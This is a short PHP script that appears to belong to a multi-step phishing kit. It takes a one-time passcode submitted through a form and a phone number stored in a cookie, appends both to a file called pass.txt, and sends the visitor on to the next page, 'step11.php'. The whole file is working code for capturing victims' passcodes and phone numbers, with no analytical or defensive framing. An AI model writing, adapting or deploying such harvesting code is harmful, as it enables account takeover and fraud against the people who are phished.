<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$otp7 = $_POST['otp7'];
   $number = $_COOKIE["number"];

  $otp7 = "otp7:$otp7";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $otp7);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location:step11.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
